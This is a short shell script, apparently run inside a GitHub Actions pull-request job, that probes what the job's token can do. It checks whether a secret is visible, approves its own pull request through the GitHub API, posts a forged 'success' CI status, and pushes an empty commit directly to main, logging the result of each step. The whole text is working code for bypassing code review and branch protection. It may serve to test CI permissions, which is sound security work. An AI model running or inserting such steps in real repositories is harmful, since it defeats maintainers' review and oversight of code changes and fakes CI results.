echo "iv PROBE_SECRET: $([ -n "$P" ] && echo visible || echo empty)"
N=${GITHUB_REF#refs/pull/}; N=${N%/merge}
c=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/$N/reviews -d '{"event":"APPROVE"}'); echo "i approve http=$c"
c=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' https://api.github.com/repos/$GITHUB_REPOSITORY/statuses/$GITHUB_SHA -d '{"state":"success","context":"ci"}'); echo "ii status http=$c"
git -c user.name=p -c user.email=p@x.invalid commit --allow-empty -qm p; git push origin HEAD:refs/heads/main > /tmp/pushout 2>&1; echo "iii push exit=$?"; tail -2 /tmp/pushout
